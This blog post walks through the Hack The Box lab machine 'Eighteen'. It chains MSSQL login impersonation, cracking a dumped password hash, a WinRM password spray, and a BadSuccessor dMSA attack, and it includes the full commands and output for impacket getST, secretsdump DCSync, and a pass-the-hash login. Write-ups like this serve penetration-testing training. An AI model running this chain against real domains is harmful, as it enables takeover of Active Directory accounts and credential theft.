---
layout: post
title: "[HTB] Eighteen"
description: "Eighteen is an Easy Windows AD machine with provided credentials for a local MSSQL account. Impersonating a privileged SQL login exposes a restricted database with a Werkzeug PBKDF2 hash that cracks to a reused password. A WinRM password spray against RID-bruteforced domain users reveals adam.scott reusing the same password. Privilege escalation exploits the BadSuccessor dMSA attack to impersonate Administrator and DCSync the domain."
background: /img/bg-machine.jpg
tags: [htb]
difficulty: Easy
---
![](/img/htb_img/Eighteen_img/img1.png)

- OS: Windows
- Release Date: 15 Nov 2025
- Difficulty: Easy

# Info
Standard credentials:
`kevin` / `iNa2we6haRj2gaw!`

# Enumeration
## Nmap recon
```
❯ sudo nmap -p- --min-rate 5000 --open -sS -n -Pn -oG allports $target
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-22 14:58 CET
Nmap scan report for 10.129.xx.xx
Host is up (0.048s latency).
Not shown: 65532 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE
80/tcp   open  http
1433/tcp open  ms-sql-s
5985/tcp open  wsman

Nmap done: 1 IP address (1 host up) scanned in 26.46 seconds
```

Scripts and versions.
```
❯ nmap -p80,1433,5985 -sCV -Pn -oN targeted $target
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-22 15:02 CET
Nmap scan report for 10.129.xx.xx
Host is up (0.048s latency).

PORT     STATE SERVICE  VERSION
80/tcp   open  http     Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Did not follow redirect to http://eighteen.htb/
1433/tcp open  ms-sql-s Microsoft SQL Server 2022 16.00.1000.00; RTM
| ms-sql-ntlm-info: 
|   10.129.xx.xx:1433: 
|     Target_Name: EIGHTEEN
|     NetBIOS_Domain_Name: EIGHTEEN
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: eighteen.htb
|     DNS_Computer_Name: DC01.eighteen.htb
|     DNS_Tree_Name: eighteen.htb
|_    Product_Version: 10.0.26100
|_ssl-date: 2025-11-22T21:03:05+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-11-22T20:23:19
|_Not valid after:  2055-11-22T20:23:19
| ms-sql-info: 
|   10.129.xx.xx:1433: 
|     Version: 
|       name: Microsoft SQL Server 2022 RTM
|       number: 16.00.1000.00
|       Product: Microsoft SQL Server 2022
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
5985/tcp open  http     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.94 seconds
```

Let's add the domains to the hosts file:
```
❯ echo "$target eighteen.htb DC01.eighteen.htb" | sudo tee -a /etc/hosts
10.129.xx.xx eighteen.htb DC01.eighteen.htb
```

As we can see, there is a HTTP server and a MSSQL server instance.
Let's look at the HTTP service.

## TCP 80: HTTP
![](/img/htb_img/Eighteen_img/img2.png)

Let's try to use the credentials provided with the machine to login.
![](/img/htb_img/Eighteen_img/img3.png)

So, the credentials are not for the webpage. Let's try to register a new user.
![](/img/htb_img/Eighteen_img/img4.png)

### Dashboard
![](/img/htb_img/Eighteen_img/img5.png)

I tried a bunch of stuff on the webpage but seems like there is nothing interesting there. Having a look back and having some credentials + a SQL server on the machine, we can try to login with `impacket-mssqlclient`:

## MSSQLclient
```
❯ impacket-mssqlclient kevin:'iNa2we6haRj2gaw!'@$target
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01): Line 1: Changed database context to 'master'.
[*] INFO(DC01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2022 RTM (16.0.1000)
[!] Press help for extra shell commands
SQL (kevin  guest@master)> 
```

It worked! Let's enumerate databases and try to use the one that seems interesting:
```
SQL (kevin  guest@master)> select name from sys.databases;
name                
-----------------   
master              
tempdb              
model               
msdb                
financial_planner   
SQL (kevin  guest@master)> use financial_planner;
ERROR(DC01): Line 1: The server principal "kevin" is not able to access the database "financial_planner" under the current security context.
SQL (kevin  guest@master)>
```

User Kevin is not able to use the `financial_planner` database.
Using other tools like `netexec` we can probably get more information about what is going on with this db.

## Netexec enumeration
```
❯ nxc mssql $target -u kevin -p 'iNa2we6haRj2gaw!' -M mssql_priv --local-auth
MSSQL       10.129.xx.xx   1433   DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:eighteen.htb)
MSSQL       10.129.xx.xx   1433   DC01             [+] DC01\kevin:iNa2we6haRj2gaw! 
MSSQL_PRIV  10.129.xx.xx   1433   DC01             [*] kevin can impersonate: appdev
```

`kevin can impersonate: appdev`

So, having this in mind, we can try to impersonate `appdev` directly through impacket.
```
❯ impacket-mssqlclient kevin:'iNa2we6haRj2gaw!'@$target
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01): Line 1: Changed database context to 'master'.
[*] INFO(DC01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2022 RTM (16.0.1000)
[!] Press help for extra shell commands
SQL (kevin  guest@master)> EXECUTE AS LOGIN = 'appdev';
SQL (appdev  appdev@master)> select name from sys.databases;
name                
-----------------   
master              
tempdb              
model               
msdb                
financial_planner   

SQL (appdev  appdev@master)> use financial_planner;
ENVCHANGE(DATABASE): Old Value: master, New Value: financial_planner
INFO(DC01): Line 1: Changed database context to 'financial_planner'.
```

Now, let's extract the information from the `users` table:
```
SQL (appdev  appdev@financial_planner)> select * from users;
  id   full_name   username   email                password_hash                                                                                            is_admin   created_at   
----   ---------   --------   ------------------   ------------------------------------------------------------------------------------------------------   --------   ----------   
1002   admin       admin      admin@eighteen.htb   pbkdf2:sha256:600000$AMtzteQIG7yAbZIa$0673ad90a0b4afb19d662336f0fce3a9edd0b7b19193717be28ce4d66c887133          1   2025-10-29 05:39:03   
```

# Foothold
## Cracking the Werkzeug PBKDF2-SHA256 Hash

The admin password was stored using Werkzeug's PBKDF2-HMAC-SHA256 format:
`pbkdf2:sha256:600000$SALT$HEX_HASH`

Hashcat does not accept this format directly, so I converted it into the structure required by mode **10900 (PBKDF2-HMAC-SHA256)**. The steps are straightforward:

1. Extract the components from the original string:
    - Iterations: `600000`
    - Salt (ASCII)
    - Hash (hex)
2. Encode the salt in Base64.
3. Convert the hex digest into raw bytes and encode it in Base64.
4. Assemble the final hash in Hashcat format:

`sha256:<iterations>:<salt_base64>:<hash_base64>`

With the hash converted, cracking works normally:
`hashcat -m 10900 -a 0 converted_hash.txt rockyou.txt`

This allows Hashcat to process Werkzeug PBKDF2 hashes even though the original format is not natively supported.

```
❯ hashcat -m 10900 -a 0 admin_hash /usr/share/wordlists/rockyou.txt
hashcat (v7.1.2) starting

<...>

sha256:600000:QU10enRlUUlHN3lBYlpJYQ==:BnOtkKC0r7GdZiM28Pzjqe3Qt7GRk3F74ozk1myIcTM=:iloveyou1

<...>
```

Cracked password: `iloveyou1`.

## Using the new password
We will be performing a password spray attack with `iloveyou1`, but for that we need a list of valid users. With `netexec` and rid-brute we can get that.
```
❯ nxc mssql $target -u kevin -p 'iNa2we6haRj2gaw!' --rid-brute --local-auth
MSSQL       10.129.xx.xx   1433   DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:eighteen.htb)
MSSQL       10.129.xx.xx   1433   DC01             [+] DC01\kevin:iNa2we6haRj2gaw! 
MSSQL       10.129.xx.xx   1433   DC01             1606: EIGHTEEN\jamie.dunn
MSSQL       10.129.xx.xx   1433   DC01             1607: EIGHTEEN\jane.smith
MSSQL       10.129.xx.xx   1433   DC01             1608: EIGHTEEN\alice.jones
MSSQL       10.129.xx.xx   1433   DC01             1609: EIGHTEEN\adam.scott
MSSQL       10.129.xx.xx   1433   DC01             1610: EIGHTEEN\bob.brown
MSSQL       10.129.xx.xx   1433   DC01             1611: EIGHTEEN\carol.white
MSSQL       10.129.xx.xx   1433   DC01             1612: EIGHTEEN\dave.green
```

So, a list of possible users could be:
```
❯ cat users.txt
───────┬───────────────────────
       │ File: users.txt
───────┼───────────────────────
   1   │ Administrator
   2   │ Guest
   3   │ krbtgt
   4   │ HR
   5   │ IT
   6   │ Finance
   7   │ jamie.dunn
   8   │ jane.smith
   9   │ alice.jones
  10   │ adam.scott
  11   │ bob.brown
  12   │ carol.white
  13   │ dave.green
───────┴───────────────────────
```

Let's try with these and if we can't we can try to expand the list.
```
❯ nxc winrm $target -u users.txt -p 'iloveyou1' --continue-on-success
WINRM       10.129.xx.xx   5985   DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:eighteen.htb) 
WINRM       10.129.xx.xx   5985   DC01             [-] eighteen.htb\Administrator:iloveyou1
WINRM       10.129.xx.xx   5985   DC01             [-] eighteen.htb\Guest:iloveyou1
WINRM       10.129.xx.xx   5985   DC01             [-] eighteen.htb\krbtgt:iloveyou1
WINRM       10.129.xx.xx   5985   DC01             [-] eighteen.htb\HR:iloveyou1
WINRM       10.129.xx.xx   5985   DC01             [-] eighteen.htb\IT:iloveyou1
WINRM       10.129.xx.xx   5985   DC01             [-] eighteen.htb\Finance:iloveyou1
WINRM       10.129.xx.xx   5985   DC01             [-] eighteen.htb\jamie.dunn:iloveyou1
WINRM       10.129.xx.xx   5985   DC01             [-] eighteen.htb\jane.smith:iloveyou1
WINRM       10.129.xx.xx   5985   DC01             [-] eighteen.htb\alice.jones:iloveyou1
WINRM       10.129.xx.xx   5985   DC01             [+] eighteen.htb\adam.scott:iloveyou1 (Pwn3d!)
WINRM       10.129.xx.xx   5985   DC01             [-] eighteen.htb\bob.brown:iloveyou1
WINRM       10.129.xx.xx   5985   DC01             [-] eighteen.htb\carol.white:iloveyou1
WINRM       10.129.xx.xx   5985   DC01             [-] eighteen.htb\dave.green:iloveyou1
```

We got a hit with `adam.scott:iloveyou1`.

## Shell as adam.scott
```
❯ evil-winrm -i $target -u 'adam.scott' -p 'iloveyou1'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\adam.scott\Documents>
```

### User flag
```
*Evil-WinRM* PS C:\Users\adam.scott\Desktop> type user.txt
<REDACTED>
```

# Privilege Escalation
We will be exploiting BadSuccessor
```
❯ wget https://raw.githubusercontent.com/LuemmelSec/Pentest-Tools-Collection/2899fbfb55a116895552d4a8d95dc91b30ed4c31/tools/ActiveDirectory/BadSuccessor.ps1

❯ mv BadSuccessor.ps1 bad.ps1
```

```
*Evil-WinRM* PS C:\Temp> upload bad.ps1
                                        
Info: Uploading /home/kali/HTB/Machines/Eighteen/content/bad.ps1 to C:\Temp\bad.ps1
                                        
Data: 22292 bytes of 22292 bytes copied
                                        
Info: Upload successful!
*Evil-WinRM* PS C:\Temp>
```

Let's import the module and run it:
```
*Evil-WinRM* PS C:\Temp> BadSuccessor -mode exploit -Path "OU=Staff,DC=eighteen,DC=htb" -Name "nory_dmsa" -DelegatedAdmin "adam.scott" -DelegateTarget "Administrator" -domain "eighteen.htb"
Creating dMSA at: LDAP://eighteen.htb/OU=Staff,DC=eighteen,DC=htb
0
0
0
0
Successfully created and configured dMSA 'nory_dmsa'
Object adam.scott can now impersonate Administrator
```

We found an interesting service at port 1080 that we can redirect using tools like `chisel` or `ligolo`, so let's try to do that and then exploit the vulnerability with getST.

Let's adjust time:
```
sudo timedatectl set-time "$(date -d "$(curl -s -I http://$target | grep -i '^Date:' | cut -d' ' -f2-)" '+%Y-%m-%d %H:%M:%S')"
```

And then using proxychains we exploit the vulnerability, impersonating dmsa and getting a ticket:
```
❯ proxychains impacket-getST eighteen.htb/adam.scott:iloveyou1 -impersonate "nory_dmsa$" -dc-ip $target -self -dmsa
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
Impacket v0.14.0.dev0+20251022.130809.0ceec09d - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.129.xx.xx:88  ...  OK
[*] Impersonating nory_dmsa$
[*] Requesting S4U2self
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.129.xx.xx:88  ...  OK
[*] Current keys:
[*] EncryptionTypes.aes256_cts_hmac_sha1_96:1d0143a4825e1f82b4c5e77653fba393a8e2d49acf721719b319e63645559346
[*] EncryptionTypes.aes128_cts_hmac_sha1_96:efb7bc8ec47d3a3926d425e23798eb48
[*] EncryptionTypes.rc4_hmac:56a908f2b16497dc9e44e2aa525fa4bf
[*] Previous keys:
[*] EncryptionTypes.rc4_hmac:0b133be956bfaddf9cea56701affddec
[*] Saving ticket in nory_dmsa$@krbtgt_EIGHTEEN.HTB@EIGHTEEN.HTB.ccache
```

Let's dump the secrets:
```
❯ proxychains -q impacket-secretsdump -k -no-pass dc01.eighteen.htb -just-dc-user Administrator -dc-ip $target
Impacket v0.14.0.dev0+20251022.130809.0ceec09d - Copyright Fortra, LLC and its affiliated companies 

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3<...REDACTED...>
[*] Cleaning up... 
```

## Shell as Administrator
```
❯ evil-winrm -i $target -u Administrator -H <REDACTED>

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

### Root flag
```
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
<REDACTED>
```
